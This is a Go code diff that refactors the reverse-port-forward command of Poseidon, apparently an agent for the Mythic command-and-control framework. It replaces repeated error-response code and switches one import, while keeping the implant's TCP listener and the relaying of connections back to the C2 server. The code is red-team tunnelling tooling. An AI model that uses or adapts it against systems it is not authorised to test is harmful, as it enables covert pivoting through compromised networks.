@@ -6,7 +6,7 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
 	"math"
 	"math/rand"
 	"net"
@@ -54,51 +54,40 @@ func Run(task structs.Task) {
 		startedGoRoutines = true
 	}
 	if err != nil {
-		errResp := structs.Response{}
-		errResp.Completed = true
-		errResp.TaskID = task.TaskID
-		errResp.Status = "error"
-		errResp.UserOutput = err.Error()
-		task.Job.SendResponses <- errResp
+		msg := task.NewResponse()
+		msg.SetError(err.Error())
+		task.Job.SendResponses <- msg
 		return
 	}
-	resp := structs.Response{}
+	msg := task.NewResponse()
 	if args.Action == "start" {
 		closeAllChannels()
 		if listener != nil {
-			if err := (*listener).Close(); err != nil {
-				errResp := structs.Response{}
-				errResp.Completed = true
-				errResp.TaskID = task.TaskID
-				errResp.Status = "error"
-				errResp.UserOutput = err.Error()
-				task.Job.SendResponses <- errResp
+			if err = (*listener).Close(); err != nil {
+				msg = task.NewResponse()
+				msg.SetError(err.Error())
+				task.Job.SendResponses <- msg
 				return
 			}
 		}
 		addr := fmt.Sprintf("0.0.0.0:%d", args.Port)
 		if l, err := net.Listen("tcp", addr); err != nil {
-			errResp := structs.Response{}
-			errResp.Completed = true
-			errResp.TaskID = task.TaskID
-			errResp.Status = "error"
-			errResp.UserOutput = err.Error()
-			task.Job.SendResponses <- errResp
+			msg = task.NewResponse()
+			msg.SetError(err.Error())
+			task.Job.SendResponses <- msg
 			return
 		} else {
 			listener = &l
 			go handleConnections(task)
 		}
-		resp.UserOutput = fmt.Sprintf("reverse port forward started on port: %d\n", args.Port)
-		resp.Completed = true
-		resp.TaskID = task.TaskID
+		msg.UserOutput = fmt.Sprintf("reverse port forward started on port: %d\n", args.Port)
+		msg.Completed = true
 	} else {
 		closeAllChannels()
-		resp.UserOutput = fmt.Sprintf("reverse port forward stoped on port: %d\n", args.Port)
-		resp.Completed = true
-		resp.TaskID = task.TaskID
+		msg.UserOutput = fmt.Sprintf("reverse port forward stoped on port: %d\n", args.Port)
+		msg.Completed = true
 	}
-	task.Job.SendResponses <- resp
+	task.Job.SendResponses <- msg
 
 }
 func closeAllChannels() {
@@ -134,7 +123,7 @@ func handleMutexMapModifications() {
 				delete(channelMap.m, msg)
 				//fmt.Printf("Removed channel (%d) from map, now length %d\n", msg, len(channelMap.m))
 			}
-		case msg := <-profiles.FromMythicRpfwdChannel:
+		case msg := <-responses.FromMythicRpfwdChannel:
 			//fmt.Printf("got message FromMythicRpfwdChannel: %d\n", msg.ServerId)
 			if _, ok := channelMap.m[msg.ServerId]; ok {
 				select {
@@ -153,19 +142,13 @@ func handleConnections(task structs.Task) {
 	for {
 		if conn, err := (*listener).Accept(); err != nil {
 			if err := (*listener).Close(); err != nil {
-				errResp := structs.Response{}
-				errResp.Completed = true
-				errResp.TaskID = task.TaskID
-				errResp.Status = "error"
-				errResp.UserOutput = err.Error()
-				task.Job.SendResponses <- errResp
+				msg := task.NewResponse()
+				msg.SetError(err.Error())
+				task.Job.SendResponses <- msg
 			} else {
-				errResp := structs.Response{}
-				errResp.Completed = true
-				errResp.TaskID = task.TaskID
-				errResp.Status = "error"
-				errResp.UserOutput = err.Error()
-				task.Job.SendResponses <- errResp
+				msg := task.NewResponse()
+				msg.SetError(err.Error())
+				task.Job.SendResponses <- msg
 				listener = nil
 			}
 			return
@@ -177,8 +160,8 @@ func handleConnections(task structs.Task) {
 				Connection: conn,
 				NewChannel: recvChan,
 			}
-			go readFromProxy(conn, profiles.InterceptToMythicRpfwdChannel, newChannelID)
-			go writeToProxy(recvChan, conn, newChannelID, profiles.InterceptToMythicRpfwdChannel)
+			go readFromProxy(conn, responses.InterceptToMythicRpfwdChannel, newChannelID)
+			go writeToProxy(recvChan, conn, newChannelID, responses.InterceptToMythicRpfwdChannel)
 		}
 	}
 
